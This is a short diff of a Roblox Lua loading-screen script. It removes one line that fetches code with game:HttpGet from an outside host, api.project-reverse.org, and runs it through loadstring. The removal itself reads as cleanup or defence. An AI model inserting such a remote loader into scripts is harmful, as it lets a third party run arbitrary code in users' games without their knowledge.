@@ -141,4 +141,3 @@ end
 
 -- Auto close if game loads early (no wait)
 game.Loaded:Connect(finishLoading)
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjNlNjBmZGFkLTY5N2EtNDI4Yi04YjgzLTQ0MTBmYzVkNWQxNSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
